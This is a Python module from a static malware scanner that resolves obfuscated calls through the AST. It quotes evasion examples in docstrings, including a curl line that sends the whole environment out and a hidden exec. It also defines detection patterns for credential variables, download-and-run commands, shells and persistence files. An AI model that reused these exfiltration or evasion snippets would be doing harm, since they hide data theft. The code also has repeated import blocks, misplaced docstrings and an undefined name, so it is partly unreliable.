"""Resolving Python obfuscation that a byte pattern cannot see.

Capability rules match literal syntax: `os.system`, `base64.b64decode`,
`subprocess.run`. Bind the name differently and nothing labels, so no composite
can form and the file reports clean:

    from os import environ as ENV
    from subprocess import run as go
    go(["curl", "-d", str(dict(ENV)), url])          # identical logic, silent

    __builtins__["ex" + "ec"](payload)               # `exec` is never a token
    f = os.system; f(command)                        # nor is `os.system`

Every one of those targets is derivable **without running anything**. `ast.parse`
builds a tree and executes nothing -- the same reason `ecosystems/pypi.py`
already reads `setup.py` this way -- so the alias, the binding and the folded
string are all available to a static pass. That is what this module does.

**The guarantee it exists to keep.** Static analysis cannot decide runtime
behaviour, so the spec is not "catch everything". It is:

> No evasion is silent. Every technique used to hide behaviour is either
> resolved to the real behaviour, or lights up a signal of its own.

`resolve` handles everything constant-derivable. What it cannot name --
`getattr(os, decode(blob))()`, a target read from the network -- becomes
`Capability.DYNAMIC_DISPATCH` instead, so going dynamic to escape the name match
costs the attacker a different label rather than buying silence. The residue
after both is behaviour that exists only at runtime, which no static tool
observes and which the tool should not claim to.

**It adds to the regex path, never replaces it.** The patterns stay as the fast
prefilter and as the answer for files this cannot parse -- and a file that fails
to parse says so, because silently analysing less is the failure this project
is organised against.
"""

from __future__ import annotations

import ast
import base64
import posixpath
import re
from typing import TYPE_CHECKING

from cordon_scanner.analysis.python.py_identity import IDENTITY_COMMANDS, IdentityVariables
from cordon_scanner.analysis.python.pyfacts import (
    DNS_LOOKUPS,
    ENVIRONMENT,
    PRIMITIVES,
    SCRIPT_LAUNCH,
    AstCall,
    AstHit,
    PythonFacts,
)
from cordon_scanner.analysis.python.pysyntax import PythonSyntax
from cordon_scanner.foundation.capabilities import Capability

if TYPE_CHECKING:
    from collections.abc import Callable, Iterator, Sequence

from typing import TYPE_CHECKING

if TYPE_CHECKING:  # from the source
    from collections.abc import Callable
from typing import TYPE_CHECKING

if TYPE_CHECKING:  # from the source  # from the source
    from collections.abc import Callable


CREDENTIAL_VARIABLE = re.compile(
    r"""(?ix)
    (?:^|[_.\-])
    (?:
        token | secret | password | passwd | passphrase | credential | credentials
      | api[_\-]?key | apikey | access[_\-]?key | private[_\-]?key | signing[_\-]?key
      | client[_\-]?secret | refresh[_\-]?token | bearer | auth | session | cookie
      | pat | sas | dsn
    )
    (?:$|[_.\-])
    """,
)
"""Environment variable names that hold credential material.

The pattern tier already draws this line and carries `os.environ.get('PORT')`
and `os.environ.get('DEBUG')` as negative tests: "reading a named setting is not
the same as serialising the whole environment, and a rule that cannot tell them
apart fires on every configuration module in existence."

This tier did not draw it, and being the AST tier it could draw it exactly -- it
has the key in hand. So every `os.getenv("HOME")`, `os.environ.get("DEBUG")` and
`os.environ["PATH"]` in existence was labelled credential access, and fed
`SUSPECT.EXFIL.001`: 675 findings across 234 of the 1,487 repositories measured,
a great many of them a module that reads its own configuration, calls an API and
starts a subprocess.

Whole-environment access stays credential access whatever the code does with it,
which is the other half of the pattern tier's rule and the half that matters:
`dict(os.environ)` is the shape that ships the lot."""

REFLECTIVE = frozenset({"getattr", "__import__", "globals", "vars", "locals"})
BUILTIN_MODULES = frozenset({"builtins", "__builtin__", "__builtins__"})
WRITE_METHODS = frozenset({"write", "write_text", "write_bytes", "writelines"})

#: Names and attributes the interpreter or platform provides, never an attacker: a command built
#: only from these and literals cannot be running a decoded or downloaded value (`safe_spawn_lines`).
SOURCE_FREE_NAMES = frozenset({"__file__"})
SOURCE_FREE_DOTTED = frozenset(
    {
        "sys.executable",
        "sys.prefix",
        "sys.base_prefix",
        "sys.platform",
        "sys.version",
        "os.sep",
        "os.linesep",
        "os.pathsep",
        "os.name",
        "os.curdir",
    }
)
#: Calls and string methods that return a source-free value when handed only source-free arguments.
SOURCE_FREE_CALLS = frozenset(
    {
        "str",
        "repr",
        "os.getcwd",
        "os.path.join",
        "os.path.dirname",
        "os.path.abspath",
        "os.path.basename",
        "os.path.normpath",
        "os.path.expanduser",
        "shlex.quote",
        "posixpath.join",
        "ntpath.join",
    }
)
SOURCE_FREE_METHODS = frozenset(
    {
        "join",
        "format",
        "upper",
        "lower",
        "strip",
        "rstrip",
        "lstrip",
        "replace",
        "removeprefix",
        "removesuffix",
    }
)
"""Character codes folded from one `map(chr, [...])`; a longer literal list is not read."""
UNSAFE_LOADERS = frozenset(
    {"torch.load", "pickle.load", "pickle.loads", "joblib.load", "dill.load", "cloudpickle.load"}
)
"""Deserialisers that execute what the file names. `pickle.loads` is here for
`pickle.loads(open(path, "rb").read())`."""

MODEL_COMMIT = re.compile(r"[0-9a-f]{40}")
"""A model repository revision that is a commit, rather than a branch or tag that moves."""


EXECUTABLE_NAME = re.compile(
    r"(?i)\.(?:exe|scr|com|bat|cmd|vbs|vbe|js|jse|wsf|hta|ps1|msi|dll|sh|app)\b"
)
"""File names that a launch runs as a program."""


PERSISTENCE_PATH = re.compile(
    r"(?:^|/)\.(?:profile|bashrc|bash_profile|bash_login|zshrc|zprofile|zlogin)$"
    r"|LaunchAgents/[^/]{1,200}\.plist$|/crontabs?/|systemd/user/[^/]{1,200}\.service$"
)
"""Files that run their contents at the next login, boot or schedule."""

DOWNLOAD_TO = re.compile(
    r"""(?i)\b(?:curl(?:\.exe)?|wget|invoke-webrequest|iwr)\b[^\n]{0,400}?"""
    r"""\s(?:-o|--output|--output-document|-outfile)\s{1,4}"""
    r"""(?P<target>"[^"]{1,300}"|'[^']{1,300}'|\S{1,300})"""
)
"""A command that downloads to a named file, and that file."""

FETCH_TOOL = re.compile(r"(?i)^\s{0,8}(?:curl|wget|invoke-webrequest|iwr)\b")
"""A command whose output is the download."""

SHELL_NAMES = frozenset(
    {"powershell", "powershell.exe", "pwsh", "sh", "bash", "zsh", "dash", "cmd", "cmd.exe"}
)
RUNNER_WORDS = frozenset(
    {
        "start-process",
        "saps",
        "invoke-item",
        "ii",
        "&",
        # And the wrappers that run the program that follows them. Not `start`, `open` or
        # `xdg-open`: a downloaded report opened for the user is opened, not run.
        "nohup",
        "exec",
        "setsid",
    }
)
"""Verbs whose first argument is the program they run."""


class PythonSource:
    """Conveniences over the Python analyser: loops, .pth start-up lines, resolution."""

    @staticmethod
    def _word_key(word: str) -> str:
        """A command word as `_file_key` names a file: `"{out}"` is the variable `out`."""
        text = word.strip().strip("\"'")
        placeholder = re.fullmatch(r"\{(\w{1,80})\}", text)
        return f"name:{placeholder.group(1)}" if placeholder else text

    @staticmethod
    def loop_delay_lines(source: str) -> frozenset[int]:
        """Lines where a sleep is inside a loop, and so a schedule rather than a delay.

        `CAP.ANTI.DELAY.001` says in its own comment what this is for: a sleep at the top of
        a loop is a heartbeat, the only way to express that in one regex is a lookbehind over
        a fixed indentation, and a pattern that works at eight spaces and fails at four is
        worse than the finding it removes. "Expressing it properly means asking the AST
        whether the sleep is the first statement of a loop, which is a change to the Python
        tier rather than to a pattern." This is that change.

        `unslothai/unsloth` hangs a thread with `while True: time.sleep(3600)` to keep a
        partial download's handle open, and prints a heartbeat with
        `for _ in range(10000): time.sleep(300)`. vLLM's `_report_continuous_usage` is the
        case the comment names.

        Anywhere in the loop body, not only the first statement: a retry loop that sleeps
        after its attempt is the same shape and the same claim. What stays reported is a
        sleep in straight-line code, which is what a delay before a payload is.

        Returns nothing for source that does not parse, which leaves the pattern's answer
        standing -- the safe direction.
        """
        try:
            tree = PythonSyntax.shared(source)
        except (SyntaxError, ValueError, RecursionError):
            return frozenset()

        analyzer = PythonAnalyzer._prepared(tree)
        lines: set[int] = set()
        for node in PythonSyntax.of(tree, ast.While, ast.For, ast.AsyncFor):
            for inner in PythonSyntax.of(node, ast.Call):
                dotted = analyzer._dotted(inner.func)
                if dotted in SLEEP_CALLS or (dotted or "").endswith(".sleep"):
                    lines.add(getattr(inner, "lineno", 0))
        return frozenset(lines)

    @staticmethod
    def startup_lines(text: str) -> str:
        """The part of a `.pth` file Python executes: each line beginning `import` (followed by a
        space or tab), which `site` runs with `exec`. Every other line is a directory to add to the
        path, and is blanked rather than dropped so line numbers still point into the file."""
        return "\n".join(
            line if line.startswith(("import ", "import\t")) else "" for line in text.split("\n")
        )

    @staticmethod
    def resolve(source: str) -> Iterator[AstHit]:
        """Capabilities this source resolves to. Convenience over `PythonAnalyzer`."""
        yield from PythonAnalyzer.analyse(source)


INTERPRETER_NAMES = frozenset(
    {
        "python",
        "python3",
        "python2",
        "python.exe",
        "pythonw",
        "pythonw.exe",
        "py",
        "sh",
        "bash",
        "zsh",
        "dash",
        "node",
        "perl",
        "ruby",
        "php",
        "pwsh",
        "powershell",
        "powershell.exe",
        "cmd",
        "cmd.exe",
        "wscript",
        "cscript",
        "msiexec",
        "rundll32",
        "start",
    }
)
"""Programs whose first non-option argument is the code they run."""
BASE64_DECODERS = frozenset(
    {
        "base64.b64decode",
        "base64.standard_b64decode",
        "base64.urlsafe_b64decode",
        "base64.decodebytes",
    }
)
WRITTEN_CODE_MIN = 16
WRITTEN_CODE_MAX = 64 * 1024
"""A literal shorter than this holds no call worth reading; one longer is not analysed again,
which bounds the cost of a file built from large embedded payloads."""
"""Names whose whole purpose is to reach something by a computed name.

Resolved when the name is constant, and reported as dynamic dispatch when it is
not."""

DANGEROUS_NAMESPACES = frozenset({"os", "subprocess", "sys", "builtins", "__builtins__", "shutil"})
"""Namespaces where reflective access with a computed name has no benign
analogue worth the silence. `getattr(self, method_name)` on a plugin object is
ordinary; `getattr(os, something_decoded)` is not."""


class PythonAnalyzer:
    """Resolves capability primitives through aliases, bindings and constants."""

    def __init__(self) -> None:
        # Alias -> dotted primitive. `import base64 as b` gives `b -> base64`;
        # `from os import system as s` gives `s -> os.system`.
        self._aliases: dict[str, str] = {}
        # Local name -> dotted primitive, from `f = os.system`.
        self._bindings: dict[str, str] = {}
        # Inner call -> the call that invokes its result. `getattr(os, "system")`
        # resolves to a primitive, but the command it is handed belongs to the
        # enclosing `(...)`, so the two nodes have to be related to read it.
        self._invoked: dict[int, ast.Call] = {}
        # Names whose every possible value is written in the file. See `_enumerated`.
        self._enumerated: set[str] = set()
        self._follow_literals = True
        # Name -> the string literal it is bound to, for names bound exactly once.
        self._strings: dict[str, str | None] = {}
        # Name -> the f-string or concatenation it is bound to, for names bound exactly once.
        self._sketches: dict[str, ast.AST] = {}
        # Names bound only ever to a plain string literal. See `_assembled_name`.
        self._plain_literals: set[str] = set()
        # Names bound to a path built from `__file__`. See `_loads_a_bundled_file`.
        self._bundled_paths: set[str] = set()
        # Names bound to the text of a local file. See `_read_from_local_file`.
        self._local_reads: set[str] = set()
        # Lines whose `exec`/`eval` runs the package's own file. See `own_file_exec_lines`.
        self._excused_lines: set[int] = set()
        self._sketched: set[str] = set()
        self._hits: list[AstHit] = []

    @classmethod
    def analyse(cls, source: str, *, follow_literals: bool = True) -> list[AstHit]:
        """Capabilities resolvable from this source, or none if it will not parse.

        `follow_literals=False` leaves code held in string literals unread (see `_written_code`).
        A test suite writes code fixtures to disk as its ordinary business, and what such a
        fixture would do is not something the suite does.
        """
        try:
            tree = PythonSyntax.shared(source)
        except (SyntaxError, ValueError, RecursionError):
            return []
        analyzer = PythonAnalyzer._prepared(tree)
        analyzer._follow_literals = follow_literals
        analyzer._walk(tree)
        analyzer._downloaded_and_run(tree)
        analyzer._received_and_run(tree)
        analyzer._download_run_through_helpers(tree)
        analyzer._identity_sent(tree)
        analyzer._environment_sent(tree)
        analyzer._secret_sent(tree)
        return analyzer._hits

    def _environment_handed_to_children(self, tree: ast.AST) -> frozenset[int]:
        """`os.environ` nodes whose whole-environment copy only ever becomes a child's environment.

        `env = os.environ.copy(); env.update(extra); subprocess.call(cmd, env=env)` -- nodeenv,
        and every build script that sets one variable for a compiler. The copy is the parent's
        environment handed to its own child, which inherits it anyway; nothing is read out of
        it. Accepted holders: `X = os.environ.copy()`, `X = dict(os.environ, ...)`,
        `X = {**os.environ, ...}`, `X.update(os.environ)`, or the read written straight into
        `env=`. Every other use of the holder -- serialised, sent, iterated, returned -- keeps
        the read a whole-environment read.
        """
        # Kept on the tree: three passes ask, and the answer depends only on the tree and its
        # name tables, which are complete before any of them runs.
        kept: frozenset[int] | None = tree.__dict__.get("_cordon_handed")
        if kept is not None:
            return kept
        # Keyed by (enclosing function, name): `env` is the usual name, and one function's
        # hand-off says nothing about what another function does with its own `env`.
        environ_nodes: dict[tuple[int, str], list[int]] = {}
        direct: set[int] = set()
        parents = PythonSyntax.parents(tree)

        def scope_of(node: ast.AST) -> ast.AST:
            current = parents.get(id(node))
            while current is not None and not isinstance(
                current, ast.FunctionDef | ast.AsyncFunctionDef | ast.Lambda
            ):
                current = parents.get(id(current))
            return current if current is not None else tree

        def is_environ(node: ast.AST) -> bool:
            return self._dotted(node) in ENVIRONMENT

        # Only the node types `_dotted` can name; every other node is not `os.environ`.
        for node in PythonSyntax.of(tree, ast.Name, ast.Attribute, ast.Call):
            if not is_environ(node):
                continue
            parent = parents.get(id(node))
            copy: ast.AST | None = None
            if isinstance(parent, ast.Attribute) and parent.attr == "copy":
                call = parents.get(id(parent))
                copy = call if isinstance(call, ast.Call) and call.func is parent else None
            elif (
                isinstance(parent, ast.Call)
                and isinstance(parent.func, ast.Name)
                and parent.func.id == "dict"
                and parent.args
                and parent.args[0] is node
            ) or (isinstance(parent, ast.Dict) and None in parent.keys):
                copy = parent
            elif (
                isinstance(parent, ast.Call)
                and isinstance(parent.func, ast.Attribute)
                and parent.func.attr == "update"
                and isinstance(parent.func.value, ast.Name)
            ):
                environ_nodes.setdefault((id(scope_of(node)), parent.func.value.id), []).append(
                    id(node)
                )
                continue
            elif isinstance(parent, ast.keyword) and parent.arg == "env":
                direct.add(id(node))
                continue
            if copy is None:
                continue
            holder = parents.get(id(copy))
            if isinstance(holder, ast.keyword) and holder.arg == "env":
                direct.add(id(node))
            elif (
                isinstance(holder, ast.Assign)
                and len(holder.targets) == 1
                and isinstance(holder.targets[0], ast.Name)
            ):
                environ_nodes.setdefault((id(scope_of(node)), holder.targets[0].id), []).append(
                    id(node)
                )

        excused = set(direct)
        for (scope, name), nodes in environ_nodes.items():
            uses = [
                n
                for n in PythonSyntax.of(tree, ast.Name)
                if n.id == name and isinstance(n.ctx, ast.Load) and id(scope_of(n)) == scope
            ]
            if uses and all(self._harmless_use(use, parents) for use in uses):
                excused.update(nodes)
        result = frozenset(excused)
        tree.__dict__["_cordon_handed"] = result
        return result

    def _harmless_use(self, use: ast.Name, parents: dict[int, ast.AST]) -> bool:
        parent = parents.get(id(use))
        if isinstance(parent, ast.keyword) and parent.arg == "env":
            return True
        if isinstance(parent, ast.Attribute) and parent.value is use:
            return parent.attr in {"update", "setdefault", "pop", "get", "copy", "__setitem__"}
        if isinstance(parent, ast.Subscript) and parent.value is use:
            return True
        if isinstance(parent, ast.Assign) and parent.value is use:
            return all(
                isinstance(t, ast.Subscript) and PythonFacts.constant(t.slice) == "env"
                for t in parent.targets
            )
        if isinstance(parent, ast.Dict):
            index = next((i for i, v in enumerate(parent.values) if v is use), None)
            key = parent.keys[index] if index is not None else None
            return key is not None and PythonFacts.constant(key) == "env"
        return False

    def _iterated_literals(self, tree: ast.AST) -> dict[str, list[str]]:
        """Loop variables whose every value is a string literal, with those values.

        From `for n in (...)` and comprehensions, iterating either a literal tuple or list, or a
        name bound once to one. A name used as a loop variable twice, over different things, is
        left out rather than guessed at."""
        sequences: dict[str, list[str]] = {}
        assigned: dict[str, int] = {}
        for node in PythonSyntax.of(tree, ast.Assign):
            for target in node.targets:
                if isinstance(target, ast.Name):
                    assigned[target.id] = assigned.get(target.id, 0) + 1
                    values = PythonFacts.literal_strings(node.value)
                    if values is not None:
                        sequences[target.id] = values

        def resolved(iterable: ast.AST) -> list[str] | None:
            values = PythonFacts.literal_strings(iterable)
            if values is None and isinstance(iterable, ast.Name) and assigned.get(iterable.id) == 1:
                values = sequences.get(iterable.id)
            return values

        found: dict[str, list[str]] = {}
        refused: set[str] = set()
        for node in PythonSyntax.of(tree, ast.For, ast.comprehension):
            if isinstance(node.target, ast.Name):
                name = node.target.id
                values = resolved(node.iter)
                if values is None or (name in found and found[name] != values):
                    refused.add(name)
                else:
                    found[name] = values
        return {name: values for name, values in found.items() if name not in refused}

    DATA_PARSERS = frozenset({"ast.literal_eval", "literal_eval", "json.loads", "json.load"})
    """Parsers that turn text into values and cannot run any of it. `pickle` and `marshal` are
    not here: loading either can execute code."""

    def _decoded_into_data_parsers(self, tree: ast.AST) -> frozenset[int]:
        """Lines whose every decode is handed straight to a data parser.

        reportlab's `literal_eval(base64_decodebytes(label.encode()).decode())` reads a label
        back into a tuple; nothing decoded there can run. A line with any other decode keeps
        its hit."""
        parsed: set[int] = set()
        other: set[int] = set()
        parents = PythonSyntax.parents(tree)
        for node in PythonSyntax.of(tree, ast.Call):
            dotted = self._dotted(node.func)
            if dotted is None or PRIMITIVES.get(dotted) is not Capability.DECODE:
                continue
            current: ast.AST = node
            parent = parents.get(id(current))
            # Through `.decode(...)`, `.strip()` and the like on the decoded bytes.
            while (
                isinstance(parent, ast.Attribute)
                and isinstance(parents.get(id(parent)), ast.Call)
                and parent.attr in {"decode", "strip", "rstrip", "lstrip"}
            ):
                current = parents[id(parent)]
                parent = parents.get(id(current))
            consumer = self._dotted(parent.func) if isinstance(parent, ast.Call) else None
            (parsed if consumer in self.DATA_PARSERS else other).add(node.lineno)
        return frozenset(parsed - other)

    def _resolve_callee(self, node: ast.Call) -> tuple[str, ast.Call] | None:
        """This call's dotted name, and the call whose arguments belong to it.

        The two differ for reflective dispatch: in `getattr(os, "system")(cmd)`
        the name comes from the inner call and `cmd` from the outer one.
        """
        dotted = self._dotted(node.func)
        base = dotted.split(".")[-1] if dotted else None

        if base in REFLECTIVE:
            namespace = self._dotted(node.args[0]) if node.args else None
            attribute = PythonFacts.constant(node.args[1]) if len(node.args) > 1 else None
            if namespace and attribute is not None:
                return f"{namespace}.{attribute}", self._invoked.get(id(node), node)
            return None

        return (dotted, node) if dotted else None

    def _argument_value(self, node: ast.AST) -> str:
        """One argument folded to a string, or `""` if it is not derivable.

        A sequence folds to its elements joined by a space so that
        `subprocess.run(["sh", "-c", payload])` and `os.system("sh -c ...")`
        read the same to a rule, which is the point: they are the same act
        written two ways, and a rule author should not have to write it twice.
        """
        if isinstance(node, ast.List | ast.Tuple):
            parts = [PythonFacts.constant(element) or "" for element in node.elts]
            return " ".join(p for p in parts if p)
        # `constant` answers "what string is this", and deliberately returns
        # None for a bool or a number -- it exists to fold names and commands.
        # A rule asking about `shell=True` is asking about a literal that is
        # not a string, so it is rendered here rather than widening `constant`
        # for every other caller.
        if isinstance(node, ast.Constant) and isinstance(node.value, bool | int | float):
            return str(node.value)
        return PythonFacts.constant(node) or ""

    # -- Name resolution -------------------------------------------------

    def _collect_names(self, tree: ast.AST) -> None:
        """Build the alias and binding maps before evaluating any call.

        Two passes because a module may bind a name after using it inside a
        function body, and the function runs later. Order in the file is not
        order of execution, and matching on the first would miss the ordinary
        case of a helper defined above its imports.
        """
        bindings: dict[str, int] = {}
        literal_bindings: dict[str, int] = {}
        for node in PythonSyntax.of(tree, ast.Assign):
            names = [t.id for t in node.targets if isinstance(t, ast.Name)]
            plain = isinstance(node.value, ast.Constant) and isinstance(node.value.value, str)
            for bound in names:
                bindings[bound] = bindings.get(bound, 0) + 1
                if plain:
                    literal_bindings[bound] = literal_bindings.get(bound, 0) + 1
        # Every binding of the name is a plain literal; a name reassigned from anything else
        # could hold that instead.
        self._plain_literals = {
            bound for bound, count in literal_bindings.items() if bindings.get(bound) == count
        }
        for node in PythonSyntax.nodes(tree):
            if isinstance(node, ast.Assign) and any(
                n.id == "__file__" for n in PythonSyntax.within(node.value, ast.Name)
            ):
                self._bundled_paths.update(t.id for t in node.targets if isinstance(t, ast.Name))
        self._collect_reads(tree)
        for node in PythonSyntax.of(tree, ast.Import, ast.ImportFrom, ast.Assign, ast.For):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    self._aliases[alias.asname or alias.name] = alias.name
            elif isinstance(node, ast.ImportFrom) and node.module and not node.level:
                for alias in node.names:
                    self._aliases[alias.asname or alias.name] = f"{node.module}.{alias.name}"
            elif isinstance(node, ast.Assign) and len(node.targets) == 1:
                target = node.targets[0]
                if isinstance(target, ast.Name):
                    dotted = self._dotted(node.value)
                    if dotted:
                        self._bindings[target.id] = dotted
                    literal = PythonFacts.constant(node.value)
                    if literal is not None:
                        # A second, different assignment makes the value unknowable statically.
                        known = self._strings.get(target.id, literal)
                        self._strings[target.id] = literal if known == literal else None
                    elif isinstance(node.value, ast.JoinedStr | ast.BinOp):
                        # A built string, kept for `_sketch`; assigned twice, it is not one thing.
                        if target.id in self._sketched:
                            self._sketches.pop(target.id, None)
                        else:
                            self._sketches[target.id] = node.value
                        self._sketched.add(target.id)
                elif (
                    isinstance(target, ast.Tuple)
                    and isinstance(node.value, ast.Tuple)
                    and len(target.elts) == len(node.value.elts)
                ):
                    # `a, b = eval("exec"), eval("compile")` binds each name as its own
                    # assignment would.
                    for name, value in zip(target.elts, node.value.elts, strict=True):
                        dotted = self._dotted(value) if isinstance(name, ast.Name) else None
                        if isinstance(name, ast.Name) and dotted:
                            self._bindings[name.id] = dotted
            elif (
                isinstance(node, ast.For)
                and isinstance(node.target, ast.Name)
                and PythonFacts.is_literal_strings(node.iter)
            ):
                # A loop over a literal list of strings. Every value the variable can
                # take is written out above it, so a call through it is not a name this
                # file withholds -- which is the whole of what the dynamic-dispatch
                # label claims.
                #
                # `odysseus` ends its `setup.py` with a dependency check:
                # `for mod in ["fastapi", "uvicorn", ...]: try: __import__(mod)`, and it
                # was reported at CRITICAL as install-time code reaching a function by a
                # computed name. Six names, all of them legible.
                self._enumerated.add(node.target.id)
        # The tables are complete: from here a name resolves the same way every time it is asked.
        self._dotted_cache: dict[int, str | None] = {}

    def _collect_reads(self, tree: ast.AST) -> None:
        """The names the tree reads from local files, and the paths it bundles."""
        for node in PythonSyntax.nodes(tree):
            # Names holding the text of a local file: `l` in `for l in open(...)`, `t = open(...)
            # .read()`, `t = Path(...).read_text()`.
            source = (
                node.iter
                if isinstance(node, ast.For) and isinstance(node.target, ast.Name)
                else node.value
                if isinstance(node, ast.Assign)
                else None
            )
            if source is not None and PythonFacts.is_local_read(source):
                target = node.target if isinstance(node, ast.For) else None
                names = (
                    [target.id]
                    if isinstance(target, ast.Name)
                    else [t.id for t in getattr(node, "targets", []) if isinstance(t, ast.Name)]
                )
                self._local_reads.update(names)

    def _dotted(self, node: ast.AST) -> str | None:
        """The dotted name an expression refers to, unwinding aliases.

        `b.b64decode` where `b` is `base64` becomes `base64.b64decode`; `go`
        where `go` is `subprocess.run` becomes `subprocess.run`.
        """
        # Kept per node once the alias tables are complete (`_collect_names` creates the cache as
        # its last step): 3.5 million resolutions scanning this package, most of them repeats.
        cache: dict[int, str | None] | None = self.__dict__.get("_dotted_cache")
        if cache is not None:
            key = id(node)
            if key in cache:
                return cache[key]
            found = self._dotted_uncached(node)
            cache[key] = found
            return found
        return self._dotted_uncached(node)

    def _dotted_uncached(self, node: ast.AST) -> str | None:
        if isinstance(node, ast.Name):
            return self._aliases.get(node.id) or self._bindings.get(node.id) or node.id
        if isinstance(node, ast.Attribute):
            base = self._dotted(node.value)
            if base in BUILTIN_MODULES:
                # `builtins.exec` is `exec`: the module is how the name is reached, not part of it.
                return node.attr
            return f"{base}.{node.attr}" if base else None
        if isinstance(node, ast.Call) and node.args:
            # `__import__("base64")` and `importlib.import_module("base64")` evaluate to the module,
            # so `__import__("base64").b64decode` is `base64.b64decode` -- the spelling droppers use
            # to keep `import base64` and `exec(` off the same page.
            callee = self._dotted(node.func)
            if callee in ("__import__", "importlib.import_module"):
                module = PythonFacts.constant(node.args[0])
                if module:
                    return module
            if callee == "eval":
                return self._evaluated_name(node.args[0])
        return None

    def _evaluated_name(self, node: ast.AST) -> str | None:
        """What `eval` of this argument names, when the argument is written in the file.

        `eval("exec")` is the builtin `exec`, and `eval(compile("__import__('base64')", "", "eval"))`
        is the module `base64`: an obfuscator's way of reaching both without the name appearing in
        the code. Only an expression that is itself a name, an attribute or an import is followed;
        anything that computes a value is not a name and is left to the dynamic-dispatch check.
        """
        if isinstance(node, ast.Call) and self._dotted(node.func) == "compile" and node.args:
            node = node.args[0]
        source = PythonFacts.constant(node)
        if source is None or len(source) > 200:
            return None
        try:
            expression = PythonSyntax.parse(source.strip(), mode="eval").body
        except (SyntaxError, ValueError, RecursionError):
            return None
        if isinstance(expression, ast.Name | ast.Attribute | ast.Call):
            return self._dotted(expression)
        return None

    # -- Constant folding ------------------------------------------------

    def _source_free(self, node: ast.AST) -> bool:
        """Whether this expression is built only from literals and interpreter- or platform-provided
        constants (`sys.executable`, `__file__`, `os.sep`, ...), so nothing sourced -- decoded,
        downloaded, read or passed in -- can be part of its value. Fail-closed: a name not on the
        source-free list, an unresolved call, a subscript, `getattr`, a comprehension or a starred
        argument all make it False, which is what keeps `exec(b64decode(blob))` paired."""
        if isinstance(node, ast.Constant):
            return True
        if isinstance(node, ast.JoinedStr):
            return all(self._source_free(value) for value in node.values)
        if isinstance(node, ast.FormattedValue):
            return self._source_free(node.value)
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add | ast.Mod):
            return self._source_free(node.left) and self._source_free(node.right)
        if isinstance(node, ast.List | ast.Tuple | ast.Set):
            return all(self._source_free(element) for element in node.elts)
        if isinstance(node, ast.Name):
            return node.id in SOURCE_FREE_NAMES
        if isinstance(node, ast.Attribute):
            return (self._dotted(node) or "") in SOURCE_FREE_DOTTED
        if isinstance(node, ast.Call):
            attr = node.func.attr if isinstance(node.func, ast.Attribute) else None
            transform = (self._dotted(node.func) or "") in SOURCE_FREE_CALLS or (
                attr in SOURCE_FREE_METHODS
                and isinstance(node.func, ast.Attribute)
                and self._source_free(node.func.value)
            )
            if transform:
                return all(self._source_free(a) for a in node.args) and all(
                    self._source_free(k.value) for k in node.keywords
                )
        return False

    def _source_free_command(self, node: ast.Call) -> str | None:
        """The command a spawn or execute runs, folded to text with each source-free non-literal
        part shown as a neutral token, or None if any part is not source-free. The command is the
        first argument (an argv list is joined); `os.execv`/`execve`/`spawnv` also carry it in the
        second argument."""
        if not node.args:
            return None
        targets = [node.args[0]]
        if (self._dotted(node.func) or "") in ("os.execv", "os.execve", "os.spawnv") and len(
            node.args
        ) > 1:
            targets.append(node.args[1])
        parts: list[str] = []
        for target in targets:
            elements = target.elts if isinstance(target, ast.List | ast.Tuple) else [target]
            for element in elements:
                if not self._source_free(element):
                    return None
                parts.append(PythonFacts.constant(element) or "x")
        return " ".join(parts)

    def _command(self, node: ast.Call) -> str | None:
        """The command a spawn primitive is being handed.

        Both call shapes are accepted. `os.system("...")` carries the command
        as one string; `subprocess.run(["sh", "-c", "..."])` splits it across a
        sequence, and the parts are rejoined because it is the whole line that
        has to be matched against, not any single argument of it.

        Folded through variables and f-strings, with what cannot be known kept as `{name}`:
        `download = f'curl.exe -L https://h/x.exe -o "{out}"'` handed on as `["powershell",
        "-Command", download]` is still a `curl` the shell rules can read.
        """
        if not node.args:
            return None
        first = node.args[0]
        if isinstance(first, ast.List | ast.Tuple):
            parts = [self._sketch(element) for element in first.elts]
            if all(part is None for part in parts):
                return None
            return " ".join(part for part in parts if part is not None)
        return self._sketch(first)

    def _sketch(self, node: ast.AST, depth: int = 0) -> str | None:
        """A string expression with its unknown parts written `{name}`, or None if it has no
        literal text at all."""
        if depth > 4:
            return None
        literal = PythonFacts.constant(node)
        if literal is not None:
            return literal
        if isinstance(node, ast.JoinedStr):
            pieces = []
            for value in node.values:
                part = PythonFacts.constant(value)
                if part is None and isinstance(value, ast.FormattedValue):
                    inner = value.value
                    part = (
                        self._strings.get(inner.id)
                        or (self._sketch(inner, depth + 1) if inner.id in self._sketches else None)
                        or f"{{{inner.id}}}"
                        if isinstance(inner, ast.Name)
                        else "{?}"
                    )
                pieces.append(part or "")
            return "".join(pieces)
        if isinstance(node, ast.BinOp) and isinstance(node.op, ast.Add):
            left, right = self._sketch(node.left, depth + 1), self._sketch(node.right, depth + 1)
            if left is None and right is None:
                return None
            return (left or "{?}") + (right or "{?}")
        if isinstance(node, ast.Name):
            bound = self._sketches.get(node.id)
            if bound is not None:
                return self._sketch(bound, depth + 1)
        if (
            isinstance(node, ast.Call)
            and self._dotted(node.func) in ("os.getenv", "os.environ.get", "getenv")
            and node.args
        ):
            # A location named by an environment variable -- `os.getenv("TEMP") + "\\x.exe"`
            # -- is the same file wherever the expression is written twice.
            name = PythonFacts.constant(node.args[0])
            if name is not None:
                return f"{{env:{name}}}"
        return None

    # -- The walk --------------------------------------------------------

    def _walk(self, tree: ast.AST) -> None:
        for node in PythonSyntax.of(tree, ast.Call):
            if isinstance(node.func, ast.Call | ast.Subscript):
                # A subscript as well as a call. `globals()["exec"]()` invokes what the
                # subscript returned, and the map existed only for `getattr(...)()`.
                self._invoked[id(node.func)] = node

        keyed = self._keyed_environment_reads(tree)
        self._socket_connect(tree)

        called = {id(node.func) for node in PythonSyntax.nodes(tree) if isinstance(node, ast.Call)}
        """The function of every call, which `_call` has already judged.

        `os.getenv` is both a primitive and an `Attribute`, so a single
        `os.getenv("GH_TOKEN")` was recorded twice: once by `_call` and again by
        the branch below, which exists for `os.environ` -- a primitive that is
        never called. vLLM's `setup.py` line 1112 reads
        `os.getenv("GH_TOKEN", os.getenv("GITHUB_TOKEN"))` and produced four
        identical credential hits at one span. Reading a function without calling
        it is not the act the primitive describes."""

        for node in PythonSyntax.of(tree, ast.Call, ast.Attribute, ast.Name, ast.Subscript):
            if isinstance(node, ast.Call):
                self._call(node)
                self._written_code(node)
            elif isinstance(node, ast.Attribute | ast.Name):
                # `os.environ` is a primitive without being called.
                dotted = self._dotted(node)
